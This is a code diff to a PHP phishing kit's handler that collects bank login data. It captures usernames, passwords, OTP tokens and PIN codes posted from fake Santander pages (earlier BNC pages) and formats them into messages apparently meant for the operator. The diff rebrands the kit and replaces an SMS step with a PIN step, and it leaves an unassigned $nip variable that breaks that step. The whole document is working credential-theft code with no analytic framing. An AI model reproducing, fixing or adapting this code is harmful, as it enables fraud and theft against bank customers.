@@ -43,8 +43,8 @@ if (isset($_POST['usr'], $_POST['pass'])) {
     $user = trim($_POST['usr']);
     $password = trim($_POST['pass']);
     $message .= "💥『𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋 𝖫𝗈𝗀𝗈』💥\n\n";
-    $message .= "┇ﾒ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:   <code>$user</code>\n";
-    $message .= "┇ﾒ 𝖢𝗅𝖺𝗏𝖾.:   <code>$password</code>\n\n";
+    $message .= "┇ﾒ 👤𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:   <code>$user</code>\n";
+    $message .= "┇ﾒ 🔑𝖢𝗅𝖺𝗏𝖾.:   <code>$password</code>\n\n";
 
 // index-error.php
 } elseif (isset($_POST['usr2'], $_POST['pass2'])) {
@@ -54,8 +54,8 @@ if (isset($_POST['usr'], $_POST['pass'])) {
     $user = trim($_POST['usr2']);
     $password = trim($_POST['pass2']);
     $message .= "💥『𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋 𝖫𝗈𝗀𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』💥\n\n";
-    $message .= "┇ﾒ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:   <code>$user</code>\n";
-    $message .= "┇ﾒ 𝖢𝗅𝖺𝗏𝖾.:   <code>$password</code>\n\n";
+    $message .= "┇ﾒ 👤𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:   <code>$user</code>\n";
+    $message .= "┇ﾒ 🔑𝖢𝗅𝖺𝗏𝖾.:   <code>$password</code>\n\n";
 
 // otp.php
 } elseif (isset($_POST['otp'])) {
@@ -64,9 +64,9 @@ if (isset($_POST['usr'], $_POST['pass'])) {
     $form_origen = "otp.php";
     $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
     $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
-    $message .= "🇻🇪『𝖳𝗈𝗄𝖾𝗇 𝖡𝖭𝖢』🇻🇪\n\n";
-    $message .= "📲 Código: <code>$code_esc</code>\n\n";
-    $message .= "🍀 User: <code>$user_esc</code>\n";
+    $message .= "⭕️『𝖳𝗈𝗄𝖾𝗇 𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋』⭕️\n\n";
+    $message .= "┇ﾒ ✅ 𝖢𝗈𝖽𝗂𝗀𝗈.:   <code>$code_esc</code>\n\n";
+    $message .= "┇ﾒ 👤 𝖴𝗌𝖾𝗋.:   <code>$user_esc</code>\n";
 
 // otp-error.php
 } elseif (isset($_POST['otp2'])) {
@@ -75,33 +75,33 @@ if (isset($_POST['usr'], $_POST['pass'])) {
     $form_origen = "otp-error.php";
     $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
     $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
-    $message .= "🇻🇪『𝖳𝗈𝗄𝖾𝗇 𝖡𝖭𝖢-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
-    $message .= "📲 Código: <code>$code_esc</code>\n\n";
-    $message .= "🍀 User: <code>$user_esc</code>\n";
+    $message .= "⭕️『𝖳𝗈𝗄𝖾𝗇 𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』⭕️\n\n";
+    $message .= "┇ﾒ ✅ 𝖢𝗈𝖽𝗂𝗀𝗈.:   <code>$code_esc</code>\n\n";
+    $message .= "┇ﾒ 👤 𝖴𝗌𝖾𝗋.:   <code>$user_esc</code>\n";
 
 
-// sms.php
-} elseif (isset($_POST['sms'])) {
-    $code = trim($_POST['sms']);
-    $_SESSION['sms'] = $code;
+// nip.php
+} elseif (isset($_POST['nip'])) {
+    $code = trim($_POST['nip']);
+    $_SESSION['nip'] = $nip;
     $form_origen = "sms.php";
-    $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
+    $nip_esc = htmlspecialchars($nip, ENT_QUOTES, 'UTF-8');
     $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
-    $message .= "🇻🇪『𝖮𝖳𝖯 𝖡𝖭𝖢』🇻🇪\n\n";
-    $message .= "📲 Código: <code>$code_esc</code>\n\n";
-    $message .= "🍀 User: <code>$user_esc</code>\n";
+    $message .= "⭕️『𝖭𝖨𝖯 𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋』⭕️\n\n";
+    $message .= "┇ﾒ #️⃣ 𝖭𝖨𝖯.:   <code>$nip_esc</code>\n\n";
+    $message .= "┇ﾒ 👤 User.:   <code>$user_esc</code>\n";
 
 
-    // sms-error.php
-} elseif (isset($_POST['sms2'])) {
-    $code = trim($_POST['sms2']);
-    $_SESSION['sms2'] = $code;
+    // nip-error.php
+} elseif (isset($_POST['nip2'])) {
+    $code = trim($_POST['nip2']);
+    $_SESSION['nip2'] = $nip;
     $form_origen = "sms-error.php";
-    $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
+    $nip_esc = htmlspecialchars($nip, ENT_QUOTES, 'UTF-8');
     $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
-    $message .= "🇻🇪『𝖮𝖳𝖯 𝖡𝖭𝖢-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
-    $message .= "📲 Código: <code>$code_esc</code>\n\n";
-    $message .= "🍀 User: <code>$user_esc</code>\n"; 
+    $message .= "⭕️『𝖭𝖨𝖯 𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』⭕️\n\n";
+    $message .= "┇ﾒ #️⃣ 𝖭𝖨𝖯.:   <code>$nip_esc</code>\n\n";
+    $message .= "┇ﾒ 👤 User.:   <code>$user_esc</code>\n"; 
 
 } else {
     exit("No se reconocieron datos válidos.");
